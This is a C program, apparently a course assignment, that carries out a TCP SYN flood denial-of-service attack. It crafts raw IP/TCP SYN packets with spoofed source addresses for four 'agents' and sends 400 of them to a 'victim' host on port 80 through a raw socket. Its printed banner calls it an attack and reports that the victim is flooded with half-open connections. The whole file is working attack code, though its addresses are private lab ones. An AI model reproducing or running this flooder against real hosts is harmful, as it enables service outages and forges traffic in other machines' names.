#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

// Pseudo header for TCP checksum
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Checksum calculation
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void send_syn_packet(int sockfd, char *source_ip, char *dest_ip, int round) {
    char packet[4096];
    struct sockaddr_in dest_addr;
    
    memset(packet, 0, 4096);
    
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = inet_addr(dest_ip);
    iph->check = checksum((unsigned short *)packet, iph->tot_len);
    
    // TCP Header - SYN packet
    tcph->source = htons(rand() % 65535);   // Random source port
    tcph->dest = htons(80);                 // Destination port
    tcph->seq = htonl(rand());              // Random sequence number
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;                          // SYN flag
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    // Calculate TCP checksum with pseudo header
    struct pseudo_header psh;
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = inet_addr(dest_ip);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    
    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
    
    tcph->check = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram);
    
    // Destination address
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(80);
    dest_addr.sin_addr.s_addr = inet_addr(dest_ip);
    
    // Send packet
    if (sendto(sockfd, packet, iph->tot_len, 0, 
               (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("Send failed");
    }
}

int main() {
    int sockfd;
    
    // 1 attacker, 4 spoofed agents, 1 victim (6 hosts total)
    char *agents[] = {"10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5"};  // 4 agents
    char victim[] = "10.0.0.6";     // Victim
    char attacker[] = "10.0.0.1";   // Attacker (for logging)
    
    int num_agents = sizeof(agents) / sizeof(agents[0]);
    int rounds = 100;  // Number of attack rounds
    
    srand(time(NULL));
    
    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed (run as root)");
        exit(1);
    }
    
    // Set IP_HDRINCL
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt failed");
        exit(1);
    }
    
    printf("╔════════════════════════════════════════════════╗\n");
    printf("║      TCP SYN Flood DDoS Attack - Assignment 11 ║\n");
    printf("╠════════════════════════════════════════════════╣\n");
    printf("║  Attacker: %-35s ║\n", attacker);
    printf("║  Victim: %-37s ║\n", victim);
    printf("║  Spoofed Agents: %d                            ║\n", num_agents);
    printf("║  Attack Rounds: %d                            ║\n", rounds);
    printf("╚════════════════════════════════════════════════╝\n\n");
    
    printf("Starting TCP SYN flood attack...\n\n");
    
    int total_packets = 0;
    
    for (int r = 0; r < rounds; r++) {
        for (int i = 0; i < num_agents; i++) {
            send_syn_packet(sockfd, agents[i], victim, r + 1);
            total_packets++;
            printf("SYN packet %d sent from %s to %s (round %d)\n", 
                   total_packets, agents[i], victim, r + 1);
        }
    }
    
    printf("\n╔════════════════════════════════════════════════╗\n");
    printf("║           Attack Summary                       ║\n");
    printf("╠════════════════════════════════════════════════╣\n");
    printf("║  Total SYN packets sent: %-21d ║\n", total_packets);
    printf("║  Victim is flooded with half-open connections ║\n");
    printf("╚════════════════════════════════════════════════╝\n");
    
    close(sockfd);
    return 0;
}


